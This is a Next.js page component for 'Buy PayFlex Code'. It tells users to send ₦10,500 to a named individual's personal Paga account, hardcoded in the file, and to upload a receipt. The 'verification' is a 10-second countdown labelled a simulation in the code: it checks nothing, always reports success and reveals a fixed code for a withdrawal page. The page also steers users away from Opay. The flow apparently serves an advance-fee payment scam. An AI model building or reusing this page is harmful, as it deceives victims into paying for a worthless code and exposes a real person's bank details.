'use client'

import React, { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import {
  ArrowLeft,
  Copy,
  CheckCircle2,
  Building2,
  UploadCloud,
  FileCheck,
  AlertTriangle,
  Volume2,
  Home,
  Loader2,
  Check,
} from 'lucide-react'

export default function BuyPayFlexCodePage() {
  const router = useRouter()
  const [showWarningModal, setShowWarningModal] = useState(true)
  const [copiedAccount, setCopiedAccount] = useState(false)
  const [copiedCode, setCopiedCode] = useState(false)
  const [receiptImage, setReceiptImage] = useState<File | null>(null)
  const [previewUrl, setPreviewUrl] = useState<string | null>(null)
  
  // Verification states
  const [isVerifying, setIsVerifying] = useState(false)
  const [countdown, setCountdown] = useState(10)
  const [showSuccessModal, setShowSuccessModal] = useState(false)

  // Static Manual Bank Details
  const MANUAL_BANK = {
    bankName: 'Paga',
    accountNumber: '1902059851',
    accountName: 'Olamilakan Oso',
    PayFlexCodeRate: '₦10,500 for the PayFlex Code',
  }

  // Updated code constant to match withdraw page
  const CORRECT_PayFlexCode_CODE = 'Payflex0102'

  // Handle 10-second timer
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (isVerifying && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1)
      }, 1000)
    } else if (isVerifying && countdown === 0) {
      setIsVerifying(false)
      setShowSuccessModal(true)
    }
    return () => clearTimeout(timer)
  }, [isVerifying, countdown])

  const handleCopy = (text: string, type: 'account' | 'code') => {
    navigator.clipboard.writeText(text)
    if (type === 'account') {
      setCopiedAccount(true)
      setTimeout(() => setCopiedAccount(false), 2000)
    } else {
      setCopiedCode(true)
      setTimeout(() => setCopiedCode(false), 2000)
    }
  }

  const handleImageChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) {
      setReceiptImage(file)
      setPreviewUrl(URL.createObjectURL(file))
    }
  }

  const handlePlayWarning = () => {
    if ('speechSynthesis' in window) {
      const speech = new SpeechSynthesisUtterance(
        'Please DO NOT use Opay to make payments. Opay transactions may not be processed correctly. Use other banks for successful transfers.'
      )
      speech.rate = 0.9
      window.speechSynthesis.speak(speech)
    } else {
      alert('Audio warning is not supported on this device.')
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!receiptImage) {
      alert('Please upload your payment receipt before submitting.')
      return
    }

    // Start 10-second verification simulation
    setCountdown(10)
    setIsVerifying(true)
  }

  return (
    <div className="min-h-screen bg-[#121212] text-white pb-16 relative">
      {/* 1. Opay Warning Modal */}
      {showWarningModal && !isVerifying && !showSuccessModal && (
        <div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-center justify-center p-3">
          <div className="bg-[#181818] border border-[#2a2a2a] rounded-2xl p-4 max-w-xs w-full shadow-2xl text-center space-y-3">
            <div className="w-12 h-12 bg-amber-500/20 rounded-xl flex items-center justify-center mx-auto">
              <AlertTriangle className="w-7 h-7 text-amber-500" />
            </div>

            <h2 className="text-lg font-bold text-red-500">Important Notice</h2>

            <p className="text-xs text-white/70 font-medium leading-relaxed">
              Please <strong className="text-white">DO NOT use Opay</strong> to make payments.
              Opay transactions may not be processed correctly.
            </p>

            <div className="flex items-center gap-2 pt-1">
              <button
                onClick={handlePlayWarning}
                className="flex-1 bg-blue-600 text-white text-xs font-semibold py-2 px-1.5 rounded-lg hover:bg-blue-700 transition flex items-center justify-center gap-1 shadow-sm"
              >
                <Volume2 className="w-3.5 h-3.5" />
                Play
              </button>

              <button
                onClick={() => setShowWarningModal(false)}
                className="flex-1 bg-[#00B67A] text-black text-xs font-semibold py-2 px-1.5 rounded-lg hover:bg-[#00a36d] transition shadow-sm"
              >
                Understand
              </button>
            </div>
          </div>
        </div>
      )}

      {/* 2. Verifying Payment Loading Modal (10 Seconds Countdown) */}
      {isVerifying && (
        <div className="fixed inset-0 z-[120] bg-black/60 backdrop-blur-sm flex items-center justify-center p-3">
          <div className="bg-[#181818] border border-[#2a2a2a] rounded-2xl p-6 max-w-xs w-full shadow-2xl text-center space-y-4">
            <div className="relative w-16 h-16 mx-auto flex items-center justify-center">
              <Loader2 className="w-16 h-16 text-[#00B67A] animate-spin" />
              <span className="absolute font-bold text-[#00B67A] text-base">{countdown}s</span>
            </div>

            <h2 className="text-lg font-bold text-white">Verifying Payment...</h2>

            <p className="text-xs text-white/60 font-medium leading-relaxed">
              Please wait while our system checks your transfer receipt confirmation ({countdown} seconds remaining).
            </p>
          </div>
        </div>
      )}

      {/* 3. Payment Received Successfully & Code Reveal Modal */}
      {showSuccessModal && (
        <div className="fixed inset-0 z-[120] bg-black/60 backdrop-blur-sm flex items-center justify-center p-3">
          <div className="bg-[#181818] border border-[#2a2a2a] rounded-2xl p-4 max-w-sm w-full shadow-2xl text-center space-y-3">
            <div className="w-12 h-12 bg-emerald-500/20 rounded-xl flex items-center justify-center mx-auto">
              <CheckCircle2 className="w-7 h-7 text-[#00B67A]" />
            </div>

            <h2 className="text-lg font-bold text-white">Payment Received Successfully!</h2>

            <p className="text-xs text-white/60 font-medium leading-relaxed">
              Here is your PayFlex Code. Copy it and paste it into your withdrawal page to proceed:
            </p>

            <div className="bg-[#121212] p-3 rounded-xl border border-[#2a2a2a] flex items-center justify-between gap-2">
              <span className="font-mono font-bold text-xs text-[#00B67A] select-all break-all text-left">
                {CORRECT_PayFlexCode_CODE}
              </span>
              <button
                onClick={() => handleCopy(CORRECT_PayFlexCode_CODE, 'code')}
                className="bg-[#00B67A] text-black p-2 rounded-lg hover:bg-[#00a36d] transition flex-shrink-0"
                title="Copy Code"
              >
                {copiedCode ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              </button>
            </div>

            <div className="space-y-2 pt-1">
              <button
                onClick={() => router.push('/withdraw')}
                className="w-full bg-[#00B67A] text-black font-semibold text-xs py-2.5 px-3 rounded-lg hover:bg-[#00a36d] transition flex items-center justify-center gap-2 shadow-sm"
              >
                Proceed to Withdrawal
              </button>

              <button
                onClick={() => router.push('/dashboard')}
                className="w-full bg-[#252525] text-white font-semibold text-xs py-2.5 px-3 rounded-lg hover:bg-[#303030] transition flex items-center justify-center gap-2"
              >
                <Home className="w-4 h-4 text-white/60" />
                Go to Homepage
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <header className="sticky top-0 z-50 bg-[#181818] border-b border-[#2a2a2a] py-2.5 px-3">
        <div className="flex items-center justify-between">
          <button onClick={() => router.back()} className="p-1 text-white/80 hover:text-white">
            <ArrowLeft className="w-5 h-5 text-white" />
          </button>
          <h1 className="text-base font-bold text-white">Buy PayFlex Code</h1>
          <div className="w-5" />
        </div>
      </header>

      <main className="px-3 py-3 max-w-lg mx-auto space-y-3">
        {/* Instruction Banner */}
        <div className="bg-[#00B67A]/10 border border-[#00B67A]/30 rounded-xl p-3 text-xs text-white/90">
          <p className="font-semibold text-[#00B67A] mb-0.5">How to purchase:</p>
          <p className="leading-tight">
            1. Transfer payment to the official account.<br />
            2. Upload a photo of your receipt.<br />
            3. Click <strong>Submit Receipt</strong> to verify.
          </p>
        </div>

        {/* Pricing Details */}
        <div className="bg-[#181818] rounded-xl p-3 border border-[#2a2a2a] shadow-sm">
          <div className="flex justify-between items-center text-xs">
            <span className="text-white/60 font-medium">PayFlex Rate</span>
            <span className="font-bold text-white text-sm">{MANUAL_BANK.PayFlexCodeRate}</span>
          </div>
        </div>

        {/* Static Manual Bank Details */}
        <div className="bg-[#181818] rounded-xl p-3 border border-[#2a2a2a] shadow-sm space-y-2.5 text-xs">
          <div className="flex items-center gap-1.5 pb-1 border-b border-[#2a2a2a]">
            <Building2 className="w-4 h-4 text-[#00B67A]" />
            <h2 className="font-bold text-white text-sm">Payment Account Details</h2>
          </div>

          <div className="flex justify-between items-center">
            <span className="text-white/60 font-medium">Bank Name</span>
            <span className="font-bold text-white">{MANUAL_BANK.bankName}</span>
          </div>

          <div className="flex justify-between items-center">
            <span className="text-white/60 font-medium">Account Number</span>
            <div className="flex items-center gap-1.5">
              <span className="font-mono font-bold text-base text-white">
                {MANUAL_BANK.accountNumber}
              </span>
              <button
                onClick={() => handleCopy(MANUAL_BANK.accountNumber, 'account')}
                className="p-1 bg-[#252525] rounded hover:bg-[#303030] text-white/80 transition"
              >
                {copiedAccount ? <CheckCircle2 className="w-3.5 h-3.5 text-[#00B67A]" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
          </div>

          <div className="flex justify-between items-center pt-1 border-t border-[#2a2a2a]">
            <span className="text-white/60 font-medium">Account Name</span>
            <span className="font-bold text-white">{MANUAL_BANK.accountName}</span>
          </div>
        </div>

        {/* Receipt Upload Box */}
        <div className="bg-[#181818] rounded-xl p-3 border border-[#2a2a2a] shadow-sm space-y-2">
          <h2 className="font-bold text-white text-xs">Upload Payment Receipt</h2>

          <label className="border border-dashed border-[#2a2a2a] rounded-lg p-4 flex flex-col items-center justify-center cursor-pointer hover:border-[#00B67A] transition bg-[#121212] relative overflow-hidden">
            <input 
              type="file" 
              accept="image/*" 
              onChange={handleImageChange} 
              className="hidden" 
            />

            {previewUrl ? (
              <div className="flex flex-col items-center gap-1">
                <img 
                  src={previewUrl} 
                  alt="Receipt Preview" 
                  className="max-h-32 rounded object-contain border border-[#2a2a2a]" 
                />
                <div className="flex items-center gap-1 text-xs font-medium text-[#00B67A] mt-1">
                  <FileCheck className="w-3.5 h-3.5" />
                  <span className="truncate max-w-[200px]">{receiptImage?.name}</span>
                </div>
              </div>
            ) : (
              <div className="flex flex-col items-center gap-1 text-center">
                <UploadCloud className="w-7 h-7 text-[#00B67A]" />
                <span className="text-xs font-semibold text-white/80">Click to upload receipt photo</span>
                <span className="text-[10px] text-white/40">PNG, JPG, or JPEG</span>
              </div>
            )}
          </label>
        </div>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          className="w-full bg-[#00B67A] text-black font-bold py-3 rounded-xl text-sm hover:bg-[#00a36d] transition shadow-sm"
        >
          Submit Receipt
        </button>
      </main>
    </div>
  )
}
